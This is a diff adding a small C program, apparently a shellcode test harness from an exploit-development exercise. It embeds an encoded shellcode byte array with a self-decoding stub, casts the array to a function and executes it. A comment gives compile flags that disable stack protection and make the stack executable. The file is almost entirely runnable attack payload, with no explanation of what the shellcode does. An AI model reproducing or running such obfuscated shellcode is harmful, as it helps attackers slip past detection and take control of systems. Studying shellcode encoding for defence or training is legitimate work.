@@ -1,0 +1,13 @@
+#include <stdio.h>
+#include <string.h>
+
+unsigned char code[] = \
+"\xeb\x0f\x5e\x80\x3e\xaa\x74\x0e\x80\x36\xaa\x80\x2e\x2f\x46\xeb\xf2\xe8\xec\xff\xff\xff\xca\x45\xd5\x12\xbb\x3d\xf4\xf4\x08\x3d\x3d\xf4\x3b\x32\x37\x12\xb8\xd5\x75\x90\x56\x05\xaa";
+
+int main(){
+	printf("Shellcode Length:  %d\n", strlen(code));
+	int (*ret)() = (int(*)())code;
+	ret();
+}
+
+//Compilation : gcc shellcode.c -o shellcode -fno-stack-protector -z execstack
